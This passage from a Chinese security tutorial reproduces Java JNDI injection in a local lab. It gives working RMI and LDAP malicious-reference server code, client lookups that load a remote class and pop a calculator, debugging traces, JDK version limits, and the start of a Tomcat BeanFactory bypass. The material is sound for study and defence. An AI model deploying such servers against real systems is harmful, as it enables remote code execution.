<span class="hljs-keyword">class</span> <span class="hljs-title class_">JNDIRMIServer</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">InitialContext</span> <span class="hljs-variable">initialContext</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>();<br><br>        <span class="hljs-comment">//initialContext.rebind(&quot;rmi://localhost:1099/remoteObj&quot;, new RemoteObjImpl());</span><br><br><br>        <span class="hljs-comment">// 在当前 JVM 中启动（或创建）一个 RMI registry，监听端口 1099</span><br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.createRegistry(<span class="hljs-number">1099</span>);<br>        <span class="hljs-comment">//将 JndiCalc 类的 JndiCalc 方法，放到 http://localhost:7777/</span><br>        <span class="hljs-comment">// 创建一个 Reference 对象（指向一个可通过工厂/远程位置获取的类）</span><br>        <span class="hljs-type">Reference</span> <span class="hljs-variable">reference</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Reference</span>(<span class="hljs-string">&quot;JndiCalc&quot;</span>, <span class="hljs-string">&quot;JndiCalc&quot;</span>, <span class="hljs-string">&quot;http://localhost:7777/&quot;</span>);<br>        <span class="hljs-comment">// 将 Reference 绑定到 JNDI 命名空间中的 rmi URL 下</span><br>        initialContext.rebind(<span class="hljs-string">&quot;rmi://localhost:1099/remoteObj&quot;</span>, reference);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242107319.png"></p><p>然后用客户端访问，</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> javax.naming.InitialContext;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JNDIRMIClient</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">InitialContext</span> <span class="hljs-variable">initialContext</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>();<br>        <span class="hljs-type">IRemoteObj</span> <span class="hljs-variable">remoteObj</span> <span class="hljs-operator">=</span> (IRemoteObj) initialContext.lookup(<span class="hljs-string">&quot;rmi://localhost:1099/remoteObj&quot;</span>);<br>        System.out.println(remoteObj.sayHello(<span class="hljs-string">&quot;hello&quot;</span>));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>弹出计算器：</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242108358.png"></p><p>这个调用过程就是 3.1 中以及分析过的，实际上还是调用了 lookup 方法</p><h3 id="调试："><a href="#调试：" class="headerlink" title="调试："></a>调试：</h3><p>在客户端的 lookup 处断点</p><p>跟到 RegistryImpl_Stub 这里，</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242108548.png"></p><p>继续跟进</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242108935.png"></p><p>这里看到 var2 被赋值了 ，这里的 var2 是一个对象变量，Ref 将值传递给了它</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242108230.png"></p><p>步入 decodeObject ，</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242108027.png"></p><p><font style="color:rgb(80, 80, 92);">先做了一个简单的判断，判断是否为 </font><code>ReferenceWrapper</code>，也就是判断是否为 <code>Reference</code> 对象</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242109861.png"></p><p>继续跟进 getObjectInstance</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242109168.png"></p><p>这里使用强转将 refInfo 转为 Reference </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242110137.png"></p><p><font style="color:rgb(80, 80, 92);">继续往下走，</font><font style="color:rgb(83, 83, 96);">getObjectFactoryBuilder() 这里获取到了恶意类</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242110090.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242110041.png"></p><p><font style="color:rgb(80, 80, 92);">继续往下走，获取到 codebase，并且进行 helper.loadClass()</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242110781.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242110428.png"></p><p>来到 newInstance() 后会调用 JndiCalc 类执行代码</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242110895.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242110953.png"></p><h2 id="3-2-Jndi-LDAP"><a href="#3-2-Jndi-LDAP" class="headerlink" title="3.2 Jndi + LDAP"></a>3.2 Jndi + LDAP</h2><h3 id="LDAP-简介"><a href="#LDAP-简介" class="headerlink" title="LDAP 简介"></a>LDAP 简介</h3><p>Lightweight Directory Access Protocol （轻量级目录访问协议）是一种开放的、与供应商无关的行业标准应用协议， 用于通过互联网协议(IP) 网络访问和维护分布式目录信息服务。目录服务在开发内联网和互联网应用程序中发挥着重要作用，因为它允许在整个网络中共享有关用户、系统、网络、服务和应用程序的信息。例如，目录服务可以提供任何有组织的记录集，通常具有层次结构，例如公司电子邮件目录。同样，电话簿是包含地址和电话号码的用户列表。</p><h3 id="LDAP-身份验证的基本流程："><a href="#LDAP-身份验证的基本流程：" class="headerlink" title="LDAP 身份验证的基本流程："></a><font style="color:rgb(25, 27, 31);">LDAP 身份验证的基本流程：</font></h3><ol><li><strong><font style="color:rgb(25, 27, 31);">用户提供凭证</font></strong><font style="color:rgb(25, 27, 31);">：用户通过客户端应用（如数据库客户端）输入用户名和密码。</font></li><li><strong><font style="color:rgb(25, 27, 31);">客户端与 LDAP 服务器通信</font></strong><font style="color:rgb(25, 27, 31);">：客户端通过 LDAP 协议与 LDAP 服务器通信，将用户名和密码发送给 LDAP 服务器。</font></li><li><strong><font style="color:rgb(25, 27, 31);">LDAP 服务器验证</font></strong><font style="color:rgb(25, 27, 31);">：LDAP 服务器检查用户名是否存在，并对密码进行验证。</font></li><li><strong><font style="color:rgb(25, 27, 31);">返回验证结果</font></strong><font style="color:rgb(25, 27, 31);">：如果用户名和密码匹配，LDAP 服务器返回认证成功的信息，允许用户访问资源。否则，返回认证失败。</font></li></ol><p><font style="color:rgb(25, 27, 31);">LDAP 支持多种认证方式，如：</font></p><ul><li><strong>匿名认证</strong><font style="color:rgb(25, 27, 31);">：不需要提供凭证，但访问权限有限。</font></li><li><strong>简单认证</strong><font style="color:rgb(25, 27, 31);">：用户提供用户名和密码进行身份验证。</font></li><li><strong>SASL</strong>（简单认证和安全层）认证：用于更复杂的认证机制，提供更高的安全性。</li></ul><h3 id="LDAP-目录服务的常用结构"><a href="#LDAP-目录服务的常用结构" class="headerlink" title="LDAP 目录服务的常用结构"></a><font style="color:rgb(25, 27, 31);">LDAP 目录服务的常用结构</font></h3><p><font style="color:rgb(25, 27, 31);">LDAP 目录中的信息组织为树形结构，称为 </font><strong><font style="color:rgb(25, 27, 31);">目录信息树（DIT）</font></strong><font style="color:rgb(25, 27, 31);">。常见的条目包括用户、组织、</font>部门等。条目使用 Distinguished Name (DN) 进行标<font style="color:rgb(25, 27, 31);">识，DN 包括所有节点的完整路径。例如，一个用户条目的 DN 可能是：</font></p><p><code>uid=john,ou=users,dc=example,dc=com</code></p><p><font style="color:rgb(25, 27, 31);">其中：</font></p><ul><li><code>uid=john</code><font style="color:rgb(25, 27, 31);"> </font><font style="color:rgb(25, 27, 31);">表示用户名为 john。</font></li><li><code>ou=users</code><font style="color:rgb(25, 27, 31);"> </font><font style="color:rgb(25, 27, 31);">表示该条目属于“users”组织单元。</font></li><li><code>dc=example,dc=com</code>表示 LDAP 服务器的域名是 <code>example.com</code>。</li></ul><h3 id="漏洞复现："><a href="#漏洞复现：" class="headerlink" title="漏洞复现："></a>漏洞复现：</h3><p>导入<code>unboundid-ldapsdk</code> 的依赖。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.unboundid<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>unboundid-ldapsdk<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.2.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br></code></pre></td></tr></table></figure><h4 id="Ldap-服务端："><a href="#Ldap-服务端：" class="headerlink" title="Ldap 服务端："></a>Ldap 服务端：</h4><h5 id="代码搭建"><a href="#代码搭建" class="headerlink" title="代码搭建"></a>代码搭建</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServer;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.InMemoryListenerConfig;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.sdk.Entry;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.sdk.LDAPException;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.sdk.LDAPResult;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.sdk.ResultCode;<br><span class="hljs-keyword">import</span> javax.net.ServerSocketFactory;<br><span class="hljs-keyword">import</span> javax.net.SocketFactory;<br><span class="hljs-keyword">import</span> javax.net.ssl.SSLSocketFactory;<br><span class="hljs-keyword">import</span> java.net.InetAddress;<br><span class="hljs-keyword">import</span> java.net.MalformedURLException;<br><span class="hljs-keyword">import</span> java.net.URL;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LdapServer</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">LDAP_BASE</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;dc=example,dc=com&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span> <span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">//此处的 url 表示返回给客户端的 codebaseURL (http://127.0.0.1:8000)</span><br>        <span class="hljs-comment">//格式为：http://127.0.0.1:port/#Refname；</span><br>        <span class="hljs-comment">//Refname 就是要加载的类，port 为 http 监听的端口</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;http://127.0.0.1:8000/#JndiCalc&quot;</span>;<br>        <span class="hljs-comment">//ldap 服务监听的端口，客户端连接这个端口执行 lookup</span><br>        <span class="hljs-type">int</span> <span class="hljs-variable">port</span> <span class="hljs-operator">=</span> <span class="hljs-number">1234</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">//配置 LDAP 监听器</span><br>            <span class="hljs-type">InMemoryDirectoryServerConfig</span> <span class="hljs-variable">config</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InMemoryDirectoryServerConfig</span>(LDAP_BASE);<br>            config.setListenerConfigs(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InMemoryListenerConfig</span>(<br>                <span class="hljs-string">&quot;listen&quot;</span>,<br>                InetAddress.getByName(<span class="hljs-string">&quot;0.0.0.0&quot;</span>),<br>                port,<br>                ServerSocketFactory.getDefault(),<br>                SocketFactory.getDefault(),<br>                (SSLSocketFactory) SSLSocketFactory.getDefault()));<br><br>            <span class="hljs-comment">//注册拦截器，该拦截器在收到 search 操作时会被调用，可以自定义返回的 entry ；正是实现“返回恶意 LDAP 引用”的地方。</span><br>            config.addInMemoryOperationInterceptor(<span class="hljs-keyword">new</span> <span class="hljs-title class_">OperationInterceptor</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(url)));<br>            <span class="hljs-type">InMemoryDirectoryServer</span> <span class="hljs-variable">ds</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InMemoryDirectoryServer</span>(config);<br>            System.out.println(<span class="hljs-string">&quot;Listening on 0.0.0.0:&quot;</span> + port);<br>            ds.startListening();<br>        &#125;<br>        <span class="hljs-keyword">catch</span> ( Exception e ) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OperationInterceptor</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">InMemoryOperationInterceptor</span> &#123;<br>        <span class="hljs-keyword">private</span> URL codebase;<br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">         * */</span> <span class="hljs-keyword">public</span> <span class="hljs-title function_">OperationInterceptor</span> <span class="hljs-params">( URL cb )</span> &#123;<br>            <span class="hljs-built_in">this</span>.codebase = cb;<br>        &#125;<br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">         * &#123;<span class="hljs-doctag">@inheritDoc</span>&#125;</span><br><span class="hljs-comment">         * * <span class="hljs-doctag">@see</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor#processSearchResult(com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult)</span><br><span class="hljs-comment">         */</span> <span class="hljs-meta">@Override</span><br>        <span class="hljs-comment">//当 LDAP 客户端做 search/lookup 时触发</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">processSearchResult</span> <span class="hljs-params">( InMemoryInterceptedSearchResult result )</span> &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">base</span> <span class="hljs-operator">=</span> result.getRequest().getBaseDN();<br>            <span class="hljs-type">Entry</span> <span class="hljs-variable">e</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Entry</span>(base);<br>            <span class="hljs-keyword">try</span> &#123;<br>                sendResult(result, base, e);<br>            &#125;<br>            <span class="hljs-keyword">catch</span> ( Exception e1 ) &#123;<br>                e1.printStackTrace();<br>            &#125;<br>        &#125;<br>        <span class="hljs-comment">///组装返回的 LDAP 条目</span><br>        <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">sendResult</span> <span class="hljs-params">( InMemoryInterceptedSearchResult result, String base, Entry e )</span> <span class="hljs-keyword">throws</span> LDAPException, MalformedURLException &#123;<br>            <span class="hljs-type">URL</span> <span class="hljs-variable">turl</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-built_in">this</span>.codebase, <span class="hljs-built_in">this</span>.codebase.getRef().replace(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-string">&#x27;/&#x27;</span>).concat(<span class="hljs-string">&quot;.class&quot;</span>));<br>            System.out.println(<span class="hljs-string">&quot;Send LDAP reference result for &quot;</span> + base + <span class="hljs-string">&quot; redirecting to &quot;</span> + turl);<br>            e.addAttribute(<span class="hljs-string">&quot;javaClassName&quot;</span>, <span class="hljs-string">&quot;Exploit&quot;</span>);<br>            <span class="hljs-type">String</span> <span class="hljs-variable">cbstring</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.codebase.toString();<br>            <span class="hljs-type">int</span> <span class="hljs-variable">refPos</span> <span class="hljs-operator">=</span> cbstring.indexOf(<span class="hljs-string">&#x27;#&#x27;</span>);<br>            <span class="hljs-keyword">if</span> ( refPos &gt; <span class="hljs-number">0</span> ) &#123;<br>                cbstring = cbstring.substring(<span class="hljs-number">0</span>, refPos);<br>            &#125;<br>            e.addAttribute(<span class="hljs-string">&quot;javaCodeBase&quot;</span>, cbstring);<br>            e.addAttribute(<span class="hljs-string">&quot;objectClass&quot;</span>, <span class="hljs-string">&quot;javaNamingReference&quot;</span>);<br>            e.addAttribute(<span class="hljs-string">&quot;javaFactory&quot;</span>, <span class="hljs-built_in">this</span>.codebase.getRef());<br>            result.sendSearchEntry(e);<br>            result.setResult(<span class="hljs-keyword">new</span> <span class="hljs-title class_">LDAPResult</span>(<span class="hljs-number">0</span>, ResultCode.SUCCESS));<br>        &#125;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>客户端：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> javax.naming.InitialContext;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JNDILdapClient</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">InitialContext</span> <span class="hljs-variable">initialContext</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>();<br>        <span class="hljs-comment">//        IRemoteObj remoteObj = (IRemoteObj) initialContext.lookup(&quot;ldap://localhost:1099/remoteObj&quot;);</span><br>        <span class="hljs-type">IRemoteObj</span> <span class="hljs-variable">remoteObj</span> <span class="hljs-operator">=</span> (IRemoteObj) initialContext.lookup(<span class="hljs-string">&quot;ldap://127.0.0.1:1234/EvilObject&quot;</span>);<br><br>        System.out.println(remoteObj.sayHello(<span class="hljs-string">&quot;hello&quot;</span>));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>用 python 开一个服务监听 8000端口</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242113052.png"></p><p>接下来启动服务端，启动客户端，弹出计算器</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242113525.png"></p><h5 id="使用-ApacheDirectoryStudio-搭建-LDAP-服务"><a href="#使用-ApacheDirectoryStudio-搭建-LDAP-服务" class="headerlink" title="使用 ApacheDirectoryStudio 搭建 LDAP 服务"></a>使用 ApacheDirectoryStudio 搭建 LDAP 服务</h5><p><strong>注意：系统的 java 环境使用 jdk 11，jdk 8 的版本都运行不了 LDAP 环境！</strong></p><p>新建一个 LDAP 服务，</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509250821834.png"></p><p>这样就搭建成功了：</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242113529.png"></p><blockquote><p>注意一点就是，LDAP+Reference的技巧远程加载Factory类不受RMI+Reference中的 <code>com.sun.jndi.rmi.object.trustURLCodebase</code>、<code>com.sun.jndi.cosnaming.object.trustURLCodebase</code>等属性的限制，所以适用范围更广。但在JDK 8u191、7u201、6u211之后，<code>com.sun.jndi.ldap.object.trustURLCodebase</code>属性的默认值被设置为 false，对 LDAP Reference 远程工厂类的加载增加了限制。</p><p>所以，当JDK版本介于 8u191、7u201、6u211 与 6u141、7u131、8u121 之间时，我们就可以利用LDAP+Reference 的技巧来进行JNDI注入的利用。</p><p><font style="color:rgb(80, 80, 92);">因此，</font><strong><font style="color:rgb(80, 80, 92);">这种利用方式的前提条件就是目标环境的JDK版本在JDK8u191、7u201、6u211以下</font></strong><font style="color:rgb(80, 80, 92);">。</font></p></blockquote><h2 id="3-3-jndi-结合-CORBA"><a href="#3-3-jndi-结合-CORBA" class="headerlink" title="3.3 jndi 结合 CORBA"></a>3.3 <font style="color:rgb(76, 76, 87);">jndi 结合 CORBA</font></h2><blockquote><p>一个简单的流程是：<code>resolve_str</code> 最终会调用到 <code>StubFactoryFactoryStaticImpl.createStubFactory</code> 去加载远程 class 并调用 newInstance 创建对象，其内部使用的 ClassLoader 是 <code>RMIClassLoader</code>，在反序列化 stub 的上下文中，默认不允许访问远程文件，因此这种方法在实际场景中比较少用。所以就不深入研究了。</p></blockquote><h2 id="3-4-绕过-jdk-高版本"><a href="#3-4-绕过-jdk-高版本" class="headerlink" title="3.4 绕过 jdk 高版本"></a>3.4 绕过 jdk 高版本</h2><h3 id="3-4-1-8u191-之前"><a href="#3-4-1-8u191-之前" class="headerlink" title="3.4.1 8u191 之前"></a>3.4.1 8u191 之前</h3><p>这里的版本为 jdk 8u121 &lt; temp &lt; 8u191 </p><p>这个之间版本绕过方法便是上文所述的 ldap 的 jndi 漏洞</p><h3 id="3-4-2-8u191-之后"><a href="#3-4-2-8u191-之后" class="headerlink" title="3.4.2 8u191 之后"></a>3.4.2 8u191 之后</h3><p><strong><font style="color:rgb(80, 80, 92);">8u191 之后，在使用 </font></strong><code>URLClassLoader</code><strong><font style="color:rgb(80, 80, 92);"> 加载器加载远程类时，</font></strong><font style="color:rgb(80, 80, 92);">通过添加 </font><strong><font style="color:rgb(83, 83, 96);">trustURLCodebase 的值是否为 true</font></strong><font style="color:rgb(80, 80, 92);"> ，让我们无法加载 codebase，也就是无法进行 URLClassLoader 的攻击。</font></p><p><font style="color:rgb(80, 80, 92);">要想绕过就要找到这么一个类：</font></p><ul><li><font style="color:rgb(80, 80, 92);">服务端本地 ClassPath 中存在恶意 Factory 类可被利用来作为 Reference Factory 进行攻击利用</font></li><li><font style="color:rgb(80, 80, 92);">Factory 类必须实现 </font><code>javax.naming.spi.ObjectFactory</code><font style="color:rgb(80, 80, 92);"> 接口，可利用该接口的 getObjectInstance() 方法</font></li></ul><p>我们找到 <code>org.apache.naming.factory.BeanFactory</code>类，其满足上述条件并存在于 Tomcat8 依赖包中，应用广泛。该类的 <code>getObjectInstance()</code> 函数中会通过反射的方式实例化 Reference 所指向的任意 Bean Class(Bean Class 就类似于我们之前说的那个 CommonsBeanUtils 这种)，并且会调用 setter 方法为所有的属性赋值。而该 Bean Class 的类名、属性、属性值，全都来自于 Reference 对象，均是攻击者可控的。</p><h4 id="绕过一：利用本地恶意-Class"><a href="#绕过一：利用本地恶意-Class" class="headerlink" title="绕过一：利用本地恶意 Class"></a>绕过一：<font style="color:rgb(76, 76, 87);">利用本地恶意 Class</font></h4><h5 id="环境："><a href="#环境：" class="headerlink" title="环境："></a>环境：</h5><p>首先是 tomcat 环境，以下三个必须存在并且版本尽量选在 9.0.64 以前的，（9.0.64 以后的版本大多数漏洞都被修复了，不能利用）</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- https://mvnrepository.com/artifact/org.apache.tomcat/tomcat-el-api --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.tomcat<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>tomcat-el-api<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>8.5.66<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br><span class="hljs-comment">&lt;!-- https://mvnrepository.com/artifact/org.apache.tomcat/tomcat-jasper-el --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.tomcat<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>tomcat-jasper-el<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>8.5.66<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br><span class="hljs-comment">&lt;!-- https://mvnrepository.com/artifact/org.apache.tomcat/tomcat-catalina --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.tomcat<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>tomcat-catalina<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>8.5.66<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><h5 id="源码复现："><a href="#源码复现：" class="headerlink" title="源码复现："></a>源码复现：</h5><p>参考：<a 